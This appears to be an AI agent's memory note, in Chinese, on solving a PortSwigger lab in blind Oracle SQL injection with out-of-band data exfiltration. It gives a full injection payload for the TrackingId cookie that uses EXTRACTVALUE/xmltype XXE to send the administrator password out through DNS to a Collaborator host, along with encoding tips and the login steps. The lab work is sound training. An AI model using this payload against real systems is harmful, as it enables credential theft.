---
metadata:
  node_type: memory
name: "PRS arm A lab-out-of-band-data-exfiltration"
description: "arm A 基线:lab-out-of-band-data-exfiltration(Oracle OOB 外泄)冷实例一次通过 - TrackingId cookie 注 EXTRACTVALUE/xmltype XXE,口令落 burp_collab 子域,登录 administrator 即 banner is-solved"
last_updated: 2026-10-09T06:40:21+08:00
created: 2026-10-09T06:40:21+08:00
---

## 2026-10-09 arm A 基线

题:`/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration`(Oracle 盲注 OOB 外泄)。
实例 `0afb00a104ef318f80f00da000030043`,range_launch launch-url 直接取号(reused:false)。

链路(一次通过):
1. range_launch launch-url 拿实例根。
2. burp_collab new → `4ns84mnsbuhfz0h4zbxk8izympsig7.oastify.com`。
3. http_dump 打实例根,TrackingId cookie 塞 Oracle XXE 载荷:
   `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml ...><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.<label>.oastify.com/"> %remote;]>'),'/l')+FROM+dual--`
   值内空格用 `+`,XML 里的 `? = " : ;` 用 `%3f %3d %22 %3a %3b`,`%` 用 `%25`(`%remote`/实体引用),`< > [ ]` 用 `%3c %3e %5b %5d`,单引号保持裸形破 SQL 串。
4. burp_collab poll → DNS 交互 sub_domain 前缀 = 口令 `w3virilv8r1gicfvcssw`(20 位,prefix `w3virilv8r1gicfvcssw`)。碰撞:同一 DNS 查询被 4 个 Collaborator 前端重复上报,prefix 一致,取其一即可。
5. http_session get /login 抓 csrf → post /login(administrator + 口令)→ 302 /my-account?id=administrator。
6. banner_verdict 带同 jar → solved:true / congrats。

要点:
- OOB 外泄读信道就用 burp_collab(公共 oastify),不必自架 dns_oob;数据落 DNS 标签明文,免解码。
- Oracle 型 OOB 走 EXTRACTVALUE+xmltype 外部 DTD(XXE),不是 UTL_HTTP/UTL_INADDR 那套;口令拼进 SYSTEM URL 的 host 段。
- 登录后 /my-account 那跳横幅仍是 is-notsolved,须用 banner_verdict 复读首页才翻(solved 翻转在终页访问)。
- cookie 值里分号必须 `%3b`,否则被 HTTP 层当 cookie 分隔符截断。

